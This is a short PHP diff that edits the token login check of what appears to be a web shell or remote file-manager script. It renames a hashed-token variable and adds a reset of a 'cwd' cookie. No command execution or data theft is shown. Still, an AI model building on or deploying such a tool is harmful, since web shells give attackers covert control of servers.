@@ -17,14 +17,15 @@ if(!function_exists('auth')){
 			$c = $_COOKIE;
 			$p = $_POST;
 			if(isset($p['token'])){
-				$your_token = sha1(md5($p['token']));
-				if($your_token==$GLOBALS['token']){
-					setcookie("token", $your_token, time()+36000, "/");
+				$token = sha1(md5($p['token']));
+				if($token==$GLOBALS['token']){
+					setcookie("token", $token, time()+36000, "/");
 					header("Location: ".get_self());
 				}
 			}
 
 			if(!isset($c['token']) || ((isset($c['token'])&&($c['token']!=$GLOBALS['token'])))){
+			    setcookie("cwd", null);
 				$res = "<!doctype html>
 		<html>
 		<head>
